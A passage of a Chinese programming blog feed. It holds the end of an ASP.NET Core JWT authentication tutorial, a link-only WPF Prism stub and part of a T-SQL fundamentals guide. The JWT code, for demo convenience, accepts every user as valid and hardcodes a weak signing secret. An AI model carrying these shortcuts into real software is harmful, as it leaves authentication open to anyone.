Request"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Ok();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;目前上面的控制器只实现了基本的逻辑，下面我们要创建签发 token 的服务，去完成具体的业务。第一步我们先创建对应的服务接口，命名为 IAuthenticateService：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IAuthenticateService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">IsAuthenticated</span>(<span class="params">LoginRequestDTO request, <span class="keyword">out</span> <span class="keyword">string</span> token</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;接下来，实现接口：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TokenAuthenticationService</span> : <span class="title">IAuthenticateService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsAuthenticated</span>(<span class="params">LoginRequestDTO request, <span class="keyword">out</span> <span class="keyword">string</span> token</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在<code>Startup</code>的<code>ConfigureServices</code>方法中注册服务：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.AddScoped&lt;IAuthenticateService, TokenAuthenticationService&gt;();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在 Controller 中注入 IAuthenticateService 服务，并完善 Action：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AuthenticationController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IAuthenticateService _authService;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AuthenticationController</span>(<span class="params">IAuthenticateService authService</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>._authService = authService;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">AllowAnonymous</span>]</span><br><span class="line">    [<span class="meta">HttpPost, Route(<span class="meta-string">"requestToken"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ActionResult <span class="title">RequestToken</span>(<span class="params">[FromBody] LoginRequestDTO request</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ModelState.IsValid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> BadRequest(<span class="string">"Invalid Request"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">string</span> token;</span><br><span class="line">        <span class="keyword">if</span> (_authService.IsAuthenticated(request, <span class="keyword">out</span> token))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Ok(token);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> BadRequest(<span class="string">"Invalid Request"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;正常情况，我们都会根据请求的用户和密码去验证用户是否合法，需要连接到数据库获取数据进行校验，我们这里为了方便，假设任何请求的用户都是合法的。<br>&emsp;&emsp;这里单独加个用户管理的服务，不在 IAuthenticateService 这个服务里面添加相应逻辑，主要遵循了职责单一原则。首先和上面一样，创建一个服务接口 IUserService：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IUserService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">IsValid</span>(<span class="params">LoginRequestDTO req</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;实现 IUserService 接口：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserService</span> : <span class="title">IUserService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//模拟测试，默认都是人为验证有效</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValid</span>(<span class="params">LoginRequestDTO req</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;同样注册到容器中：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.AddScoped&lt;IUserService, UserService&gt;();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;接下来，就要完善 TokenAuthenticationService 签发 token 的逻辑，首先要注入 IUserService 和 TokenManagement，然后实现具体的业务逻辑，这个 token 的生成还是使用的 Jwt 的类库提供的 API，具体不详细描述。<br>&emsp;&emsp;特别注意下 TokenManagement 的注入是以 IOptions 的接口类型注入的，还记得是在<code>StartpUp</code>中吗？我们是通过配置项的方式注册 TokenManagement 类型的。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TokenAuthenticationService</span> : <span class="title">IAuthenticateService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IUserService _userService;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> TokenManagement _tokenManagement;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TokenAuthenticationService</span>(<span class="params">IUserService userService, IOptions&lt;TokenManagement&gt; tokenManagement</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _userService = userService;</span><br><span class="line">        _tokenManagement = tokenManagement.Value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsAuthenticated</span>(<span class="params">LoginRequestDTO request, <span class="keyword">out</span> <span class="keyword">string</span> token</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        token = <span class="keyword">string</span>.Empty;</span><br><span class="line">        <span class="keyword">if</span> (!_userService.IsValid(request))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">var</span> claims = <span class="keyword">new</span>[]</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">new</span> Claim(ClaimTypes.Name,request.Username)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(_tokenManagement.Secret));</span><br><span class="line">        <span class="keyword">var</span> credentials = <span class="keyword">new</span> SigningCredentials(key, SecurityAlgorithms.HmacSha256);</span><br><span class="line">        <span class="keyword">var</span> jwtToken = <span class="keyword">new</span> JwtSecurityToken(_tokenManagement.Issuer, _tokenManagement.Audience, claims, expires: DateTime.Now.AddMinutes(_tokenManagement.AccessExpiration), signingCredentials: credentials);</span><br><span class="line"></span><br><span class="line">        token = <span class="keyword">new</span> JwtSecurityTokenHandler().WriteToken(jwtToken);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;准备好测试试用的 API，打上<code>Authorize</code>特性，表明需要授权。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line">[<span class="meta">Route(<span class="meta-string">"[controller]"</span>)</span>]</span><br><span class="line">[<span class="meta">Authorize</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">WeatherForecastController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> <span class="keyword">string</span>[] Summaries = <span class="keyword">new</span>[]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"Freezing"</span>, <span class="string">"Bracing"</span>, <span class="string">"Chilly"</span>, <span class="string">"Cool"</span>, <span class="string">"Mild"</span>, <span class="string">"Warm"</span>, <span class="string">"Balmy"</span>, <span class="string">"Hot"</span>, <span class="string">"Sweltering"</span>, <span class="string">"Scorching"</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ILogger&lt;WeatherForecastController&gt; _logger;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WeatherForecastController</span>(<span class="params">ILogger&lt;WeatherForecastController&gt; logger</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _logger = logger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">HttpGet</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerable&lt;WeatherForecast&gt; <span class="title">Get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> rng = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">return</span> Enumerable.Range(<span class="number">1</span>, <span class="number">5</span>).Select(index =&gt; <span class="keyword">new</span> WeatherForecast</span><br><span class="line">        &#123;</span><br><span class="line">            Date = DateTime.Now.AddDays(index),</span><br><span class="line">            TemperatureC = rng.Next(<span class="number">-20</span>, <span class="number">55</span>),</span><br><span class="line">            Summary = Summaries[rng.Next(Summaries.Length)]</span><br><span class="line">        &#125;)</span><br><span class="line">        .ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在我们可以测试验证了，我们可以使用 Postman 来进行 HTTP 请求，先启动 HTTP 服务，获取 URL，先测试一个访问需要授权的接口，但没有携带 token 信息，返回是 401，表示未授权。</p>
<figure class="image-box">
                <img src="683694-20200110184421844-68601763.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;下面我们先通过认证接口，获取 token，居然报错，查询了下，发现 HS256 算法的秘钥长度最新为 128 位，转换成字符至少 16 字符，之前设置的秘钥是 123456，所以导致异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.ArgumentOutOfRangeException: IDX10603: Decryption failed. Keys tried: &apos;HS256&apos;. Exceptions caught: &apos;128&apos;. token: &apos;48&apos; (Parameter &apos;KeySize&apos;) at</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;更新秘钥：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">"tokenManagement": &#123;</span><br><span class="line">    "secret": "123456123456123456",</span><br><span class="line">    "issuer": "webapi.cn",</span><br><span class="line">    "audience": "WebApi",</span><br><span class="line">    "accessExpiration": 30,</span><br><span class="line">    "refreshExpiration": 60</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;重新发起请求，成功获取 token：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.</span><br><span class="line">eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJleHAiOjE1Nzg2NDUyMDMsImlzcyI6IndlYmFwaS5jbiIsImF1ZCI6IldlYkFwaSJ9.</span><br><span class="line">AehD8WTAnEtklof2OJsvg0U4_o8_SjdxmwUjzAiuI-o</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="683694-20200110184411897-1612763683.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;把 token 带到之前请求的 API 中，重新测试，成功获取数据：</p>
<figure class="image-box">
                <img src="683694-20200110184403969-331881185.png" alt title class>
                <p></p>
            </figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp;基于 token 的认证方式，让我们构建分布式/松耦合的系统更加容易。任何地方生成的 token，只有拥有相同秘钥，就可以在任何地方进行签名校验。<br>&emsp;&emsp;当然要用好 JWT 认证方式，还有其他安全细节需要处理，比如 Payload 中不能存放敏感信息，使用 HTTPS 的加密传输方式等等，可以根据业务实际需要再进一步安全加固。<br>&emsp;&emsp;同时我们也发现使用 token，就可以摆脱 Cookie 的限制，所以 JWT 是移动 APP 开发的首选。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> ASPNETCore </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WPF Prism 框架 教程]]></title>
      <url>/2020/01/19/WpfPrismTutorial/</url>
      <content type="html"><![CDATA[<blockquote>
<p>待更新</p>
</blockquote>
<blockquote>
<p>数据绑定：<a href="https://www.cnblogs.com/ryzen/p/11905866.html" target="_blank" rel="noopener">https://www.cnblogs.com/ryzen/p/11905866.html</a><br>命令：<a href="https://www.cnblogs.com/ryzen/p/12143825.html" target="_blank" rel="noopener">https://www.cnblogs.com/ryzen/p/12143825.html</a><br>模块化：<a href="https://www.cnblogs.com/ryzen/p/12185054.html" target="_blank" rel="noopener">https://www.cnblogs.com/ryzen/p/12185054.html</a><br>事件聚合器：<a href="https://www.cnblogs.com/ryzen/p/12196619.html" target="_blank" rel="noopener">https://www.cnblogs.com/ryzen/p/12196619.html</a>  </p>
</blockquote>
<a id="more"></a>]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> WPF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[T-SQL 语言基础]]></title>
      <url>/2020/01/13/MicrosoftSQLServer2008T-SQLFundamentals/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/edisonchou/p/6106176.html" target="_blank" rel="noopener">https://www.cnblogs.com/edisonchou/p/6106176.html</a><br>一：SQL Server 的体系结构<br>二：查询<br>三：表表达式<br>四：集合运算  </p>
</blockquote>
<blockquote>
<p><a href="https://www.cnblogs.com/edisonchou/p/6106755.html" target="_blank" rel="noopener">https://www.cnblogs.com/edisonchou/p/6106755.html</a><br>五：透视、逆透视及分组<br>六：数据修改<br>八：可编程对象  </p>
</blockquote>
<blockquote>
<p><a href="https://www.cnblogs.com/edisonchou/p/6129717.html" target="_blank" rel="noopener">https://www.cnblogs.com/edisonchou/p/6129717.html</a><br>七：事务和并发  </p>
</blockquote>
<a id="more"></a>

<h1 id="SQL-Server-体系结构"><a href="#SQL-Server-体系结构" class="headerlink" title="SQL Server 体系结构"></a>SQL Server 体系结构</h1><h2 id="数据库的物理布局"><a href="#数据库的物理布局" class="headerlink" title="数据库的物理布局"></a>数据库的物理布局</h2><figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;数据库在物理上由数据文件和事务日志文件组成，每个数据库必须至少有一个数据文件和一个日志文件。<br>&emsp;&emsp;（1）数据文件用于保存数据库对象数据。数据库必须至少有一个主文件组（Primary），而用户定义的文件组则是可选的。Primary 文件组包括 主数据文件（.mdf），以及数据库的系统目录（catalog）。可以选择性地为 Primary 增加多个辅助数据文件（.ndf）。用户定义的文件组只能包含辅助数据文件。<br>&emsp;&emsp;（2）日志文件则用于保存 SQL Server 为了维护事务而需要的信息。虽然 SQL Server 可以同时写多个数据文件，但同一时刻只能以顺序方式写一个日志文件。</p>
<blockquote>
<p><code>.mdf</code>、<code>.ldf</code>和<code>.ndf</code><br>&emsp;&emsp;<code>.mdf</code>代表 Master Data File，<code>.ldf</code>代表 Log Data File，而<code>.ndf</code>代表 Not Master Data File（非主数据文件）。</p>
</blockquote>
<h2 id="架构（Schema）和对象"><a href="#架构（Schema）和对象" class="headerlink" title="架构（Schema）和对象"></a>架构（Schema）和对象</h2><p>&emsp;&emsp;一个数据库包含多个架构，而每个架构又包括多个对象。可以将架构看作是各种对象的<strong>容器</strong>，这些对象可以是表（table）、视图（view）、存储过程（stored procedure）等等。</p>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;此外，架构也是一个命名空间，用作对象名称的前缀。例如，架设在架构 Sales 中有一个 Orders 表，架构限定的对象名称是 Sales.Orders。如果在引用对象时省略架构名称，SQL Server 将采用一定的办法来分析出架构名称是什么。<strong>如果不显式指定架构，那么在解析对象名称时，就会要付出一些没有意义的额外代价。</strong>因此，建议都加上架构名称。</p>
<hr>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><h2 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h2><p>（1）关于<code>SELECT</code>子句：使用<code>*</code>号是糟糕的习惯</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Sales.Shippers;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在绝大多数情况下，使用星号是一种糟糕的编程习惯，在此还是建议大家即使需要查询表的所有列，也应该显式地指定它们。</p>
<p>（2）关于<code>FROM</code>子句：显示指定架构名称<br>&emsp;&emsp;通过显示指定架构名称，可以保证得到的对象的确是你原来想要的，而且还不必付出任何额外的代价。</p>
<p>（3）关于<code>TOP</code>子句：T-SQL 独有关键字<br>&emsp;&emsp;① 可以使用<code>PERCENT</code>关键字按百分比计算满足条件的行数；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP (<span class="number">1</span>) <span class="keyword">PERCENT</span> orderid, orderdate, custid, empid</span><br><span class="line"><span class="keyword">FROM</span> Sales.Orders</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> orderdate <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面这条 SQL 就会请求最近更新过的前 1% 个订单。</p>
<p>&emsp;&emsp;② 可以使用<code>WITH TIES</code>选项请求返回所有具有相同结果的行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP (<span class="number">5</span>) <span class="keyword">WITH</span> <span class="keyword">TIES</span> orderid, orderdate, custid, empid</span><br><span class="line"><span class="keyword">FROM</span> Sales.Orders</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> orderdate <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面这条 SQL 请求返回与 TOP n 行中最后一行的排序值相同的其他所有行。</p>
<p>（4）关于<code>OVER</code>子句：为行定义一个窗口以便进行特定的运算<br>&emsp;&emsp;<code>OVER</code>子句的优点在于<strong>能够在返回基本列的同时，在同一行对它们进行聚合；也可以在表达式中混合使用基本列和聚合值列。</strong><br>&emsp;&emsp;例如，下面的查询为 OrderValues 的每一行计算当前价格占总价格的百分比，以及当前价格占客户总价格的百分比。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> orderid, custid, val,</span><br><span class="line"><span class="number">100.0</span> * val / <span class="keyword">SUM</span>(val) <span class="keyword">OVER</span>() <span class="keyword">AS</span> pctall,</span><br><span class="line"><span class="number">100.0</span> * val / <span class="keyword">SUM</span>(val) <span class="keyword">OVER</span>(<span class="keyword">PARTITION</span> <span class="keyword">BY</span> custid) <span class="keyword">AS</span> pctcust</span><br><span class="line"><span class="keyword">FROM</span> Sales.OrderValues;</span><br></pre></td></tr></table></figure>

<p>（5）子句的逻辑处理顺序</p>
<figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<p>（6）运算符的优先级</p>
<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>

<p>（7）<code>CASE</code>表达式<br>&emsp;&emsp;① 简单表达式：将一个值与一组可能的取值进行比较，并返回满足第一个匹配的结果；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> productid,productname,categoryid,categoryname=(</span><br><span class="line">    <span class="keyword">CASE</span> categoryid</span><br><span class="line">        <span class="keyword">WHEN</span> <span class="number">1</span> <span class="keyword">THEN</span> <span class="string">'Beverages'</span></span><br><span class="line">        <span class="keyword">WHEN</span> <span class="number">2</span> <span class="keyword">THEN</span> <span class="string">'Condiments'</span></span><br><span class="line">        <span class="keyword">WHEN</span> <span class="number">3</span> <span class="keyword">THEN</span> <span class="string">'Confections'</span></span><br><span class="line">        <span class="keyword">WHEN</span> <span class="number">4</span> <span class="keyword">THEN</span> <span class="string">'Dairy Products'</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">'Unkonw Category'</span></span><br><span class="line">    <span class="keyword">END</span>)</span><br><span class="line"><span class="keyword">FROM</span> Production.Products;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② 搜索表达式：将返回结果为 <em>TRUE</em> 的第一个<code>WHEN</code>逻辑表达式所关联的<code>THEN</code>子句中指定的值。如果没有任何<code>WHEN</code>表达式结果为 <em>TRUE</em> ，<code>CASE</code>表达式则返回<code>ELSE</code>子句中出现的值。（如果没有指定<code>ELSE</code>，则默认返回 <em>NULL</em> ）；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> orderid, custid, val, valuecategory=(</span><br><span class="line">  <span class="keyword">CASE</span> </span><br><span class="line">    <span class="keyword">WHEN</span> val &lt; <span class="number">1000.00</span>    <span class="keyword">THEN</span> <span class="string">'Less than 1000'</span></span><br><span class="line">    <span class="keyword">WHEN</span> val <span class="keyword">BETWEEN</span> <span class="number">1000.00</span> <span class="keyword">AND</span> <span class="number">3000.00</span> <span class="keyword">THEN</span> <span class="string">'Between 1000 and 3000'</span></span><br><span class="line">    <span class="keyword">WHEN</span> val &gt; <span class="number">3000.00</span>    <span class="keyword">THEN</span> <span class="string">'More than 3000'</span></span><br><span class="line">    <span class="keyword">ELSE</span> <span class="string">'Unknown'</span></span><br><span class="line">  <span class="keyword">END</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">FROM</span> Sales.OrderValues</span><br></pre></td></tr></table></figure>

<p>（8）三值谓词逻辑：<code>TRUE</code>、<code>FALSE</code>与<code>UNKNOWN</code><br>&emsp;&emsp;SQL 支持使用<code>NULL</code>表示缺少的值，它使用的是三值谓词逻辑，代表计算结果可以是<code>TRUE</code>、<code>FALSE</code>与<code>UNKNOWN</code>。在 SQL 中，对于<code>UNKNOWN</code>和<code>NULL</code>的处理不一致，这就需要我们在编写每一条查询语句时应该明确地注意到正在使用的是三值谓词逻辑。<br>&emsp;&emsp;例如，我们要请求返回 region 列不等于 WA 的所有行，则需要在查询过滤条件中显式地增加一个对 <em>NULL</em> 值的测试：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> custid, country, region, city</span><br><span class="line"><span class="keyword">FROM</span> Sales.Customers</span><br><span class="line"><span class="keyword">WHERE</span> region &lt;&gt; N<span class="string">'WA'</span></span><br><span class="line">  <span class="keyword">OR</span> region <span class="keyword">IS</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;另外，T-SQL 对于 <em>NULL</em> 值的处理是先输出 <em>NULL</em> 值再输出非 <em>NULL</em> 值的顺序，如果想要先输出非 <em>NULL</em> 值，则需要改变一下排序条件，例如下面的请求：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> custid, region</span><br><span class="line"><span class="keyword">from</span> sales.Customers</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">case</span> </span><br><span class="line"><span class="keyword">when</span> region <span class="keyword">is</span> <span class="literal">null</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span>), region;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当 region 列为 <em>NULL</em> 时返回 1，否则返回 0。非 <em>NULL</em> 值的表达式返回值为 0，因此，它们会排在 <em>NULL</em> 值（表达式返回 1）的前面。如上所示的将<code>CASE</code>表达式作为第一个拍序列，并把 region 列指定为第二个拍序列。这样，非 <em>NULL</em> 值也可以正确地参与排序，是一个完整解决方案的查询。</p>
<p>（9）<code>LIKE</code>谓词的花式用法<br>&emsp;&emsp;① <code>%</code>（百分号）通配符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empid, lastname</span><br><span class="line"><span class="keyword">FROM</span> HR.Employees</span><br><span class="line"><span class="keyword">WHERE</span> lastname <span class="keyword">LIKE</span> N<span class="string">'D%'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② <code>_</code>（下划线）通配符：下划线代表任意单个字符<br>&emsp;&emsp;下面请求返回 lastname 第二个字符为 e 的所有员工：</p>
